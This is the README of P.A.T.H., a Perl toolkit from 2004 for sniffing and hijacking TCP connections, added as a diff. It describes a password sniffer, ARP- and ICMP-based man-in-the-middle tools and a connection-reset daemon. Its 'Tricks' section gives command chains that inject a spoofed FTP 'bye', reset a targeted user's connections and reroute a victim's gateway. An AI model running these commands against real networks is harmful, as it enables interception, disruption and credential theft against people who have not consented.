@@ -1,0 +1,88 @@
+            ______       _______       _______      _______     
+           |   __ \     |   _   |     |_     _|    |   |   |    
+           |    __/ __  |       | __    |   | __   |       | __ 
+           |___|   |__| |___|___||__|   |___||__|  |___|___||__|
+
+            Perl         Advanced        TCP        Hijacking
+
+                    The hijackers P.A.T.H. to galaxy
+                    [http://p-a-t-h.sourceforge.net]
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Programmed by Bastian Ballmann and Stefan Krecher
+Last update: 24.07.2004
+
+This program is free software; you can redistribute it and/or modify it under 
+the terms of the GNU General Public License version 2 as published by the Free 
+Software Foundation.
+
+This program is distributed in the hope that it will be useful, but WITHOUT 
+ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS 
+FOR A PARTICULAR PURPOSE. 
+See the GNU General Public License for more details. 
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+---:[ Requirements
+
+Perl
+NetPacket modules
+Net::Pcap
+Net::RawIP
+Data::Hexdumper
+Libpcap
+To use the GUI versions: Tk + XFree86 + Xlibs development files
+
+
+---:[ Disclaimer
+
+THIS PROJECT WAS DEVELOPED FOR TESTING AND DEMONSTRATION PURPOSE ONLY! 
+THE AUTHORS DONT FEEL RESPONSIBLE FOR ILLEGAL ABUSE OF THIS PIECE OF 
+SOFTWARE AND WE ADVICE YOU TO USE IT LEGALLY AND DO NOT BREAK THE LAW!
+
+
+---:[ Description
+
+P.A.T.H is a collection of tools for inspecting and hijacking network 
+connections written in Perl. Currently the project consists of a 
+packetgenerator (constructing TCP/IP, UDP/IP, ICMP and ARP packets), a RST 
+daemon (to reset TCP connections), a password and network sniffer (with 
+special mail and telnet modes), an ICMP redirector (to implement 
+man-in-the-middle attacks without ARP poisoning), an ARP redirector (to 
+implement man-in-the-middle attacks using ARP poisoning), an automatic 
+hijacking daemon for plain protocols (like telnet) and the IDS testing tool 
+feed_snort.
+The project features both a Tk GUI and a terminal interfaces for every tool.
+An description of the installation can be found in the file INSTALL.
+If you have any questions first read the README of the tool you want to use and
+have a look at the FAQ. 
+Otherwise post the question in the P.A.T.H. forum. You can find it on the 
+project page http://p-a-t-h.sourceforge.net.
+If you want to report a bug please read the bug reporting questions in the FAQ.
+Thanks!
+Now have phun with the hijackers P.A.T.H to galaxy! ;)
+And may the source be with you.
+
+
+---:[ Tricks
+
+Wait for a user to login via ftp, start hijackd and send a spoofed bye command
+crazysniffer.pl -n 1 -e 'logged' -f 'port 21' && \
+hijackd.pl -p 21 -S 'bye'
+
+If a user (192.168.1.2) sends an irc message to user foobar, reset all his network connections
+crazysniffer.pl -n 1 -e 'privmsg foobar' -f 'port 6667 and host 192.168.1.2' && \
+easterrst.pl -f 'host 192.168.1.2'
+
+If a user (192.168.1.2) tries to send packets to the gateway (192.168.1.1) send an icmp redirect 
+message to redirect his default gw to 192.168.1.3
+crazysniffer.pl -n 1 -f 'host 192.168.1.1 and host 192.168.1.2' && \
+icmpredir.pl -h 192.168.1.2 -a 192.168.1.1 -g 192.168.1.3 -r 0.0.0.0
+
+
+---:[ Thanks
+
+Kahless and Henry Buerger for testing pre-STABLE
+
+:[EOF
